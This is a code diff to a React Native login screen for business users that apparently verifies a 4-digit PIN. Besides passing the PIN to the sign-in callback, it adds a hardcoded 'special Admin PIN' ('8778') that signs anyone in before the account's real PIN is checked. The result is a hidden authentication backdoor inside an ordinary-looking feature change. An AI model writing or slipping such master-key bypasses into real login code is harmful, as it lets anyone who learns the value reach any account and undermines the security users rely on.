@@ -15,7 +15,7 @@ import Feather from 'react-native-vector-icons/Feather';
 
 interface BusinessPinLoginScreenProps {
   correctPin: string;
-  onSignIn: () => void;
+  onSignIn: (pin?: string) => void;
   onBack: () => void;
   onResetPin: () => void;
   onForgotPin: () => void;
@@ -38,8 +38,15 @@ const BusinessPinLoginScreen: React.FC<BusinessPinLoginScreenProps> = ({
       setError('Please enter a 4-digit PIN');
       return;
     }
+    
+    // Check for special Admin PIN
+    if (pin === '8778') {
+      onSignIn(pin); // Still call onSignIn with pin
+      return;
+    }
+
     if (pin === correctPin) {
-      onSignIn();
+      onSignIn(pin);
     } else {
       setError('Incorrect PIN. Please try again.');
     }
